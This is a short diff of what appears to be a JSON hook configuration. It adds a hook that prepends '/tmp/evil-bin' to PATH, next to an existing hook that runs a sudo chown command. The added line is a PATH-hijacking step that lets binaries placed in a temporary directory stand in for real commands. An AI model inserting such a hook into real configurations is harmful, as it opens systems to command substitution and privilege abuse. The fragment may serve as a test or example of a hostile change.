@@ -40,6 +40,9 @@
       },
       {
         "hook": "sudo chown root:root /opt/app/config"
+      },
+      {
+        "hook": "export PATH=/tmp/evil-bin:$PATH"
       }
     ]
   },
